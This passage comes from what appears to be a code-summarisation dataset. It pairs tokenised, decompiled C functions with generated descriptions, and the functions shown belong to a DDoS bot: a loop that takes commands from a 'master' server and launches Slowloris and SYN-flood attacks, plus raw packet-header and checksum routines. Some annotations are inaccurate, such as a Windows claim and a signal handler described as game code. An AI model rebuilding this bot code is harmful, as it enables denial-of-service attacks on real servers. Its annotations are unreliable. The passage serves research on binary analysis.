            "close",
            "(",
            "pipedes",
            "[",
            "1",
            "]",
            ")",
            ";",
            "flood_with_syn",
            "(",
            "a2",
            ",",
            "a3",
            ",",
            "a4",
            ",",
            "pipedes",
            "[",
            "0",
            "]",
            ")",
            ";",
            "}",
            "wait_and_close",
            "(",
            "pipedes",
            "[",
            "1",
            "]",
            ")",
            ";",
            "break",
            ";",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v10",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read an unsigned 64-bit integer from the segment of the current thread's Thread Information Block (TIB) on the Windows operating system, providing low-level access to thread-specific data.",
            "The \"close\" function appears to be part of a larger codebase, likely a C or C++ program, where it is used to close file descriptors and perform cleanup operations after using various file I/O and memory mapping functions.",
            "The function named \"flood\" appears to be designed to send a given packet to multiple devices in a network, effectively \"flooding\" the network with the packet's contents, potentially for purposes like broadcasting or multicasting.",
            "The function `slow_loris` appears to be part of a program employing the Slowloris technique, a type of denial-of-service attack, by setting up TCP connections to a target server using specified parameters such as URI, device, and number of connections.",
            "The `and_close` function seems to perform error checking and closing operations on file descriptors or streams, possibly related to appending data to files or handling errors in input/output streams, ensuring proper cleanup and error reporting.",
            "The function `return` seems to be a placeholder or a marker used within a collection of code snippets, suggesting the return or output of results or values from functions or operations.",
            "The function `readfsqword` is likely intended to read an unsigned 64-bit integer from the FS (file segment) segment register, commonly used in low-level programming for accessing thread-local storage or other system-specific data structures.",
            "The function \"flood_with\" appears to be a part of a network packet generation or flooding tool, likely designed for testing or benchmarking network performance, by repeatedly sending packets with specified parameters to a destination address.",
            "Based on the function name \"qword\" and the absence of code snippets, it appears that the function may be intended to operate on 64-bit quad-word data types or perform operations related to quad-words, possibly in assembly language or low-level programming contexts."
        ],
        "longer_label": "The code defines a function for performing Distributed Denial of Service (DDoS) attacks using various techniques, such as Slowloris and SYN flooding, likely within a larger C or C++ program, and utilizes low-level operations for managing file descriptors and thread-specific data on the Windows operating system."
    },
    {
        "id": 383,
        "docstring_tokens": [
            "This",
            "code",
            "initializes",
            "a",
            "socket",
            ",",
            "sets",
            "up",
            "a",
            "connection",
            "with",
            "a",
            "specified",
            "IP",
            "address",
            "and",
            "port",
            ",",
            "and",
            "displays",
            "a",
            "message",
            "upon",
            "successful",
            "connection",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "uint16_t",
            "a2",
            ")",
            "{",
            "main_sock",
            "=",
            "make_socket",
            "(",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "server",
            ".",
            "sa_data",
            "[",
            "2",
            "]",
            "=",
            "inet_addr",
            "(",
            "a1",
            ")",
            ";",
            "server",
            ".",
            "sa_family",
            "=",
            "2",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "server",
            ".",
            "sa_data",
            "=",
            "htons",
            "(",
            "a2",
            ")",
            ";",
            "if",
            "(",
            "connect",
            "(",
            "main_sock",
            ",",
            "&",
            "server",
            ",",
            "0x10u",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"connect error\"",
            ")",
            ";",
            "_exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "return",
            "printf",
            "(",
            "\"\\x1B[0;35m[+] Connected to %s \\x1B[0m\\n\"",
            ",",
            "a1",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `inet_` appears to be a wrapper for network address conversion functions like `inet_pton` and `inet_ntoa`, facilitating the conversion between string representations of IP addresses and their binary forms, primarily used for IPv4 address manipulation within a networking context.",
            "The `htons` function appears to be used for converting a 16-bit value from host byte order to network byte order (big-endian), typically used in networking functions for ensuring consistency across different platforms.",
            "The \"perror\" function is used to print an error message to the standard error stream along with a descriptive error message corresponding to the current value of the errno variable, typically used in error handling to provide insight into the cause of an error.",
            "The function \"return\" is used as a placeholder or tag in the provided code snippets, typically indicating a point where a value is being returned from a function or block of code."
        ],
        "longer_label": "The provided code is an initialization function in C, facilitating the establishment of a network connection by creating a socket, converting the input IP address and port number to the appropriate network format, attempting to connect to the specified address, and printing a success message upon successful connection, while incorporating error handling using the perror function."
    },
    {
        "id": 384,
        "docstring_tokens": [
            "A",
            "function",
            "to",
            "connect",
            "to",
            "the",
            "master",
            "server",
            ",",
            "read",
            "data",
            ",",
            "and",
            "perform",
            "different",
            "actions",
            "based",
            "on",
            "the",
            "received",
            "data",
            "such",
            "as",
            "shutting",
            "down",
            ",",
            "responding",
            "to",
            "specific",
            "commands",
            ",",
            "and",
            "initiating",
            "various",
            "types",
            "of",
            "DDOS",
            "attacks",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "char",
            "*",
            "v1",
            ";",
            "unsigned",
            "int",
            "v2",
            ";",
            "int",
            "v3",
            ";",
            "char",
            "*",
            "v4",
            ";",
            "unsigned",
            "int",
            "v5",
            ";",
            "unsigned",
            "__int8",
            "v6",
            ";",
            "int",
            "v7",
            ";",
            "signed",
            "__int16",
            "v8",
            ";",
            "char",
            "*",
            "v9",
            ";",
            "unsigned",
            "int",
            "v10",
            ";",
            "unsigned",
            "int",
            "v11",
            ";",
            "unsigned",
            "int",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "signed",
            "__int16",
            "v14",
            ";",
            "unsigned",
            "__int8",
            "v15",
            ";",
            "int",
            "v16",
            ";",
            "unsigned",
            "int",
            "v17",
            ";",
            "unsigned",
            "int",
            "v18",
            ";",
            "unsigned",
            "int",
            "v19",
            ";",
            "unsigned",
            "int",
            "v20",
            ";",
            "unsigned",
            "int",
            "v21",
            ";",
            "char",
            "*",
            "v22",
            ";",
            "char",
            "*",
            "v23",
            ";",
            "char",
            "*",
            "v24",
            ";",
            "char",
            "*",
            "v25",
            ";",
            "char",
            "*",
            "v26",
            ";",
            "char",
            "*",
            "v27",
            ";",
            "char",
            "*",
            "src",
            ";",
            "char",
            "nptr",
            "[",
            "5",
            "]",
            ";",
            "char",
            "v30",
            "[",
            "7",
            "]",
            ";",
            "char",
            "v31",
            "[",
            "32",
            "]",
            ";",
            "char",
            "dest",
            "[",
            "32",
            "]",
            ";",
            "char",
            "s",
            "[",
            "88",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v34",
            ";",
            "v34",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "0x51uL",
            "L",
            ")",
            ";",
            "memset",
            "(",
            "dest",
            ",",
            "0",
            ",",
            "0x1FuL",
            "L",
            ")",
            ";",
            "memset",
            "(",
            "nptr",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "nptr",
            ")",
            ")",
            ";",
            "memset",
            "(",
            "v30",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "v30",
            ")",
            ")",
            ";",
            "v16",
            "=",
            "read",
            "(",
            "main_sock",
            ",",
            "s",
            ",",
            "0x50uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v16",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"Unable to recv Data: \"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "v16",
            ")",
            "break",
            ";",
            "printf",
            "(",
            "\"Data: %s\\n\"",
            ",",
            "s",
            ")",
            ";",
            "if",
            "(",
            "!",
            "strncmp",
            "(",
            "s",
            ",",
            "\"[!SHUTDOWN!]\"",
            ",",
            "0xCuL",
            "L",
            ")",
            ")",
            "{",
            "close",
            "(",
            "main_sock",
            ")",
            ";",
            "puts",
            "(",
            "\"Shutdown signal from Master\"",
            ")",
            ";",
            "_exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "strncmp",
            "(",
            "s",
            ",",
            "\"UP?\"",
            ",",
            "3uL",
            "L",
            ")",
            ")",
            "{",
            "write",
            "(",
            "main_sock",
            ",",
            "\"?YES!\"",
            ",",
            "5uL",
            "L",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "!",
            "strncmp",
            "(",
            "s",
            ",",
            "\"SLOW-LORIS\"",
            ",",
            "0xAuL",
            "L",
            ")",
            ")",
            "{",
            "v1",
            "=",
            "index",
            "(",
            "s",
            ",",
            "32",
            ")",
            ";",
            "src",
            "=",
            "v1",
            "+",
            "1",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "index",
            "(",
            "v1",
            "+",
            "2",
            ",",
            "32",
            ")",
            ";",
            "v21",
            "=",
            "v2",
            "-",
            "(",
            "_DWORD",
            ")",
            "src",
            ";",
            "strncpy",
            "(",
            "dest",
            ",",
            "src",
            ",",
            "(",
            "int",
            ")",
            "(",
            "v2",
            "-",
            "(",
            "_DWORD",
            ")",
            "src",
            ")",
            ")",
            ";",
            "dest",
            "[",
            "v21",
            "]",
            "=",
            "0",
            ";",
            "printf",
            "(",
            "\"\\x1B[0;35mIP: %s\\n\"",
            ",",
            "dest",
            ")",
            ";",
            "strncpy",
            "(",
            "nptr",
            ",",
            "&",
            "src",
            "[",
            "v21",
            "+",
            "1",
            "]",
            ",",
            "4uL",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"Threads: %s\\x1B[0m\\n\"",
            ",",
            "nptr",
            ")",
            ";",
            "v3",
            "=",
            "atoi",
            "(",
            "nptr",
            ")",
            ";",
            "DDOS",
            "(",
            "0",
            ",",
            "dest",
            ",",
            "0",
            ",",
            "v3",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "!",
            "strncmp",
            "(",
            "s",
            ",",
            "\"SYN-FLOOD\"",
            ",",
            "9uL",
            "L",
            ")",
            ")",
            "{",
            "v4",
            "=",
            "index",
            "(",
            "s",
            ",",
            "32",
            ")",
            ";",
            "v26",
            "=",
            "v4",
            "+",
            "1",
            ";",
            "v5",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "index",
            "(",
            "v4",
            "+",
            "2",
            ",",
            "32",
            ")",
            ";",
            "v20",
            "=",
            "v5",
            "-",
            "(",
            "_DWORD",
            ")",
            "v26",
            ";",
            "strncpy",
            "(",
            "dest",
            ",",
            "v26",
            ",",
            "(",
            "int",
            ")",
            "(",
            "v5",
            "-",
            "(",
            "_DWORD",
            ")",
            "v26",
            ")",
            ")",
            ";",
            "dest",
            "[",
            "v20",
            "]",
            "=",
            "0",
            ";",
            "printf",
            "(",
            "\"\\x1B[0;32mIP: %s\\n\"",
            ",",
            "dest",
            ")",
            ";",
            "v27",
            "=",
            "&",
            "v26",
            "[",
            "v20",
            "+",
            "1",
            "]",
            ";",
            "v6",
            "=",
            "(",
            "unsigned",
            "__int8",
            ")",
            "index",
            "(",
            "v27",
            ",",
            "32",
            ")",
            ";",
            "v15",
            "=",
            "v6",
            "-",
            "(",
            "_BYTE",
            ")",
            "v27",
            ";",
            "strncpy",
            "(",
            "nptr",
            ",",
            "v27",
            ",",
            "(",
            "unsigned",
            "__int8",
            ")",
            "(",
            "v6",
            "-",
            "(",
            "_BYTE",
            ")",
            "v27",
            ")",
            ")",
            ";",
            "nptr",
            "[",
            "v15",
            "]",
            "=",
            "0",
            ";",
            "printf",
            "(",
            "\"Threads: %s\\n\"",
            ",",
            "nptr",
            ")",
            ";",
            "strncpy",
            "(",
            "v30",
            ",",
            "&",
            "v27",
            "[",
            "v15",
            "+",
            "1",
            "]",
            ",",
            "6uL",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"port: %s\\x1B[0m\\n\"",
            ",",
            "v30",
            ")",
            ";",
            "v7",
            "=",
            "atoi",
            "(",
            "nptr",
            ")",
            ";",
            "v8",
            "=",
            "atoi",
            "(",
            "v30",
            ")",
            ";",
            "DDOS",
            "(",
            "1",
            ",",
            "dest",
            ",",
            "v8",
            ",",
            "v7",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "s",
            "[",
            "0",
            "]",
            "=",
            "=",
            "42",
            ")",
            "{",
            "v9",
            "=",
            "index",
            "(",
            "s",
            ",",
            "32",
            ")",
            ";",
            "v22",
            "=",
            "v9",
            "+",
            "1",
            ";",
            "v10",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "index",
            "(",
            "v9",
            "+",
            "2",
            ",",
            "32",
            ")",
            ";",
            "v17",
            "=",
            "v10",
            "-",
            "(",
            "_DWORD",
            ")",
            "v22",
            ";",
            "strncpy",
            "(",
            "dest",
            ",",
            "v22",
            ",",
            "(",
            "int",
            ")",
            "(",
            "v10",
            "-",
            "(",
            "_DWORD",
            ")",
            "v22",
            ")",
            ")",
            ";",
            "dest",
            "[",
            "v17",
            "]",
            "=",
            "0",
            ";",
            "printf",
            "(",
            "\"\\x1B[0;36mIP: %s|\\n\"",
            ",",
            "dest",
            ")",
            ";",
            "v23",
            "=",
            "&",
            "v22",
            "[",
            "v17",
            "+",
            "1",
            "]",
            ";",
            "v11",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "index",
            "(",
            "v23",
            "+",
            "1",
            ",",
            "32",
            ")",
            ";",
            "v18",
            "=",
            "v11",
            "-",
            "(",
            "_DWORD",
            ")",
            "v23",
            ";",
            "strncpy",
            "(",
            "v31",
            ",",
            "v23",
            ",",
            "(",
            "int",
            ")",
            "(",
            "v11",
            "-",
            "(",
            "_DWORD",
            ")",
            "v23",
            ")",
            ")",
            ";",
            "v31",
            "[",
            "v18",
            "]",
            "=",
            "0",
            ";",
            "printf",
            "(",
            "\"URL: %s\\n\"",
            ",",
            "v31",
            ")",
            ";",
            "v24",
            "=",
            "&",
            "v23",
            "[",
            "v18",
            "+",
            "1",
            "]",
            ";",
            "v12",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "index",
            "(",
            "v24",
            "+",
            "1",
            ",",
            "32",
            ")",
            ";",
            "v19",
            "=",
            "v12",
            "-",
            "(",
            "_DWORD",
            ")",
            "v24",
            ";",
            "strncpy",
            "(",
            "v30",
            ",",
            "v24",
            ",",
            "(",
            "int",
            ")",
            "(",
            "v12",
            "-",
            "(",
            "_DWORD",
            ")",
            "v24",
            ")",
            ")",
            ";",
            "v30",
            "[",
            "v19",
            "]",
            "=",
            "0",
            ";",
            "printf",
            "(",
            "\"Port for SYN_FLOOD: %s\\n\"",
            ",",
            "v30",
            ")",
            ";",
            "v25",
            "=",
            "rindex",
            "(",
            "s",
            ",",
            "32",
            ")",
            "+",
            "1",
            ";",
            "strncpy",
            "(",
            "nptr",
            ",",
            "v25",
            ",",
            "4uL",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"Threads: %s\\x1B[0m\\n\"",
            ",",
            "nptr",
            ")",
            ";",
            "v13",
            "=",
            "atoi",
            "(",
            "nptr",
            ")",
            ";",
            "v14",
            "=",
            "atoi",
            "(",
            "v30",
            ")",
            ";",
            "DDOS",
            "(",
            "2",
            ",",
            "dest",
            ",",
            "v14",
            ",",
            "v13",
            ",",
            "v31",
            ")",
            ";",
            "}",
            "}",
            "puts",
            "(",
            "\"[*] Server Closed the connection\"",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v34",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__readfsqword` function likely reads a quadword (64 bits) from the FS segment register on x86 architectures, facilitating low-level access to operating system data structures or thread-local storage.",
            "The `memset` function is used to set a block of memory to a specified value, typically used for initializing memory to zero or other constant values."
        ],
        "longer_label": "The provided code appears to be a function `connect_to_master` which establishes a connection with a master server, reads data from the server, and performs different actions based on the received commands, including handling shutdown signals, responding to queries, and initiating various types of distributed denial-of-service (DDoS) attacks based on the received instructions, using low-level memory manipulation and system calls."
    },
    {
        "id": 385,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "creates",
            "a",
            "socket",
            "with",
            "the",
            "specified",
            "protocol",
            "and",
            "returns",
            "the",
            "socket",
            "file",
            "descriptor",
            ",",
            "reporting",
            "an",
            "error",
            "if",
            "the",
            "creation",
            "fails",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "unsigned",
            "int",
            "v1",
            ";",
            "v1",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "v1",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"Failed to create socket\"",
            ")",
            ";",
            "_exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "return",
            "v1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `perror` function in C is used to print an error message corresponding to the current value of the `errno` variable, typically after a system call fails, providing information about the error that occurred.",
            "The `_exit` function is a system call used for process termination, and in the provided context, it's aliasing the `exit` function when compiling with the PURIFY flag for compatibility with a tool like Purify, which facilitates memory debugging by tracing memory leaks during program execution."
        ],
        "longer_label": "The given C code creates a socket and handles potential failure by printing an error message using `perror` and terminating the process with `_exit` in case of failure, potentially for compatibility with memory debugging tools like Purify."
    },
    {
        "id": 386,
        "docstring_tokens": [
            "The",
            "function",
            "initializes",
            "an",
            "array",
            "Q",
            "with",
            "values",
            "based",
            "on",
            "the",
            "input",
            "x",
            "and",
            "a",
            "constant",
            "PHI",
            ",",
            "using",
            "a",
            "loop",
            "to",
            "set",
            "the",
            "remaining",
            "values",
            "in",
            "the",
            "array",
            "."
        ],
        "code_tokens": [
            "int",
            "*",
            "FUN0",
            "init_rand",
            "(",
            "int",
            "a1",
            ")",
            "{",
            "int",
            "*",
            "result",
            ";",
            "int",
            "i",
            ";",
            "Q",
            "[",
            "0",
            "]",
            "=",
            "a1",
            ";",
            "dword_B744",
            "=",
            "a1",
            "-",
            "1640531527",
            ";",
            "result",
            "=",
            "(",
            "int",
            "*",
            ")",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "a1",
            "+",
            "1013904242",
            ")",
            ";",
            "dword_B748",
            "=",
            "a1",
            "+",
            "1013904242",
            ";",
            "for",
            "(",
            "i",
            "=",
            "3",
            ";",
            "i",
            "<",
            "=",
            "4095",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "result",
            "=",
            "Q",
            ";",
            "Q",
            "[",
            "i",
            "]",
            "=",
            "Q",
            "[",
            "i",
            "-",
            "2",
            "]",
            "^",
            "Q",
            "[",
            "i",
            "-",
            "3",
            "]",
            "^",
            "i",
            "^",
            "0x9E3779B9",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is an implementation of the Xorshift random number generator, initializing an array `Q` with a given seed `a1` and then filling it with pseudo-random values using a specific mathematical formula."
    },
    {
        "id": 387,
        "docstring_tokens": [
            "The",
            "code",
            "generates",
            "a",
            "random",
            "32-bit",
            "unsigned",
            "integer",
            "using",
            "the",
            "CMWC",
            "algorithm",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "v0",
            ";",
            "int",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "i_4710",
            "=",
            "(",
            "(",
            "_WORD",
            ")",
            "i_4710",
            "+",
            "1",
            ")",
            "&",
            "0xFFF",
            ";",
            "v3",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "c",
            "+",
            "18782L",
            "L",
            "*",
            "(",
            "unsigned",
            "int",
            ")",
            "Q",
            "[",
            "i_4710",
            "]",
            ";",
            "c",
            "=",
            "HIDWORD",
            "(",
            "v3",
            ")",
            ";",
            "v2",
            "=",
            "v3",
            "+",
            "HIDWORD",
            "(",
            "v3",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v3",
            "+",
            "HIDWORD",
            "(",
            "v3",
            ")",
            ")",
            "<",
            "HIDWORD",
            "(",
            "v3",
            ")",
            ")",
            "{",
            "+",
            "+",
            "v2",
            ";",
            "+",
            "+",
            "c",
            ";",
            "}",
            "v0",
            "=",
            "i_4710",
            ";",
            "Q",
            "[",
            "i_4710",
            "]",
            "=",
            "-",
            "2",
            "-",
            "v2",
            ";",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "Q",
            "[",
            "v0",
            "]",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to implement a function `rand_cmwc` for generating pseudo-random numbers using the Complementary Multiply-With-Carry (CMWC) algorithm, but without annotations, it's difficult to provide a conclusive analysis."
    },
    {
        "id": 388,
        "docstring_tokens": [
            "The",
            "function",
            "``",
            "setup_ip_header",
            "''",
            "initializes",
            "the",
            "fields",
            "of",
            "an",
            "IP",
            "header",
            "structure",
            "with",
            "specific",
            "values",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "__int16",
            "*",
            "a1",
            ",",
            "int",
            "a2",
            ")",
            "{",
            "unsigned",
            "__int16",
            "*",
            "v2",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "0L",
            "L",
            ";",
            "while",
            "(",
            "a2",
            ">",
            "0",
            ")",
            "{",
            "v2",
            "=",
            "a1",
            "+",
            "+",
            ";",
            "v6",
            "+",
            "=",
            "*",
            "v2",
            ";",
            "-",
            "-",
            "a2",
            ";",
            "}",
            "return",
            "~",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "(",
            "(",
            "v6",
            ">",
            ">",
            "16",
            ")",
            "+",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v6",
            ")",
            ">",
            ">",
            "16",
            ")",
            "+",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v6",
            ">",
            ">",
            "16",
            ")",
            "+",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v6",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function named `csum` that calculates the checksum of an array of unsigned 16-bit integers by summing up the elements and performing bitwise operations, returning the complement of the result."
    },
    {
        "id": 389,
        "docstring_tokens": [
            "The",
            "function",
            "sets",
            "up",
            "a",
            "TCP",
            "header",
            "with",
            "specific",
            "values",
            "for",
            "source",
            ",",
            "sequence",
            ",",
            "acknowledgement",
            "sequence",
            ",",
            "reserved",
            "bits",
            ",",
            "data",
            "offset",
            ",",
            "SYN",
            "flag",
            ",",
            "window",
            "size",
            ",",
            "checksum",
            ",",
            "and",
            "urgent",
            "pointer",
            "."
        ],
        "code_tokens": [
            "in_addr_t",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "in_addr_t",
            "result",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "a1",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "a1",
            "&",
            "0xF0",
            "|",
            "5",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "a1",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "a1",
            "&",
            "0xF",
            "|",
            "0x40",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "1",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2",
            ")",
            "=",
            "40",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "4",
            ")",
            "=",
            "htonl",
            "(",
            "0xD431u",
            ")",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "6",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "=",
            "-",
            "1",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "9",
            ")",
            "=",
            "6",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "10",
            ")",
            "=",
            "0",
            ";",
            "result",
            "=",
            "inet_addr",
            "(",
            "\"192.168.3.100\"",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "12",
            ")",
            "=",
            "result",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"inet_\" likely provides utilities for handling network address conversion and manipulation within a C program, including converting between IPv4 addresses and binary representations."
        ],
        "longer_label": "The provided code is likely setting up an IPv4 header with specified parameters, including version, header length, type of service, total length, identification, flags, fragment offset, time to live, protocol, header checksum, source IP address, and destination IP address, utilizing functions for network address conversion and manipulation within a C program."
    },
    {
        "id": 390,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "signal",
            "handler",
            "function",
            "that",
            "waits",
            "for",
            "child",
            "processes",
            "to",
            "terminate",
            "in",
            "the",
            "background",
            "and",
            "sets",
            "the",
            "errno",
            "value",
            "back",
            "to",
            "its",
            "original",
            "state",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "s",
            ")",
            "{",
            "int",
            "saved_errno",
            ";",
            "saved_errno",
            "=",
            "*",
            "__errno_location",
            "(",
            ")",
            ";",
            "while",
            "(",
            "waitpid",
            "(",
            "-",
            "1",
            ",",
            "0L",
            "L",
            ",",
            "1",
            ")",
            ">",
            "0",
            ")",
            ";",
            "*",
            "__errno_location",
            "(",
            ")",
            "=",
            "saved_errno",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `location` appears to be part of a larger codebase related to a game or simulation, likely involving movement or positioning, utilizing a struct to represent coordinates and possibly incorporating keyboard and screen management functionalities."
        ],
        "longer_label": "The provided code defines a signal handler function `sigHandler` which is likely part of a larger codebase involving a game or simulation, potentially related to movement or positioning, and incorporates functionalities related to keyboard and screen management."
    },
    {
        "id": 391,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "'flood",
            "'",
            "that",
            "sends",
            "multiple",
            "packets",
            "using",
            "raw",
            "sockets",
            "with",
            "random",
            "source",
            "IP",
            "and",
            "port",
            "numbers",
            ",",
            "looping",
            "until",
            "a",
            "stop",
            "flag",
            "is",
            "set",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "a1",
            "=",
            "htons",
            "(",
            "0x162Eu",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "4",
            ")",
            "=",
            "random",
            "(",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "13",
            ")",
            "&",
            "=",
            "0x3Fu",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "12",
            ")",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "12",
            ")",
            "&",
            "0xF",
            "|",
            "0x50",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "13",
            ")",
            "|",
            "=",
            "2u",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "14",
            ")",
            "=",
            "htonl",
            "(",
            "0xFFFFu",
            ")",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            "=",
            "0",
            ";",
            "result",
            "=",
            "a1",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "18",
            ")",
            "=",
            "0",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `htons` function is used to convert a 16-bit integer from host byte order to network byte order, commonly used for network communication protocols like TCP/IP."
        ],
        "longer_label": "The provided code is a function in C/C++ for setting up a TCP header where it converts a 16-bit integer to network byte order, generates a random value, sets specific bits in the header, and prepares various fields for network communication."
    },
    {
        "id": 392,
        "docstring_tokens": [
            "The",
            "code",
            "executes",
            "a",
            "SYN",
            "flood",
            "attack",
            "using",
            "multiple",
            "threads",
            "on",
            "a",
            "specified",
            "IP",
            "address",
            "and",
            "port",
            ",",
            "with",
            "the",
            "attack",
            "being",
            "controlled",
            "by",
            "a",
            "separate",
            "thread",
            "that",
            "listens",
            "for",
            "commands",
            "to",
            "stop",
            "the",
            "attack",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "void",
            "*",
            "a1",
            ")",
            "{",
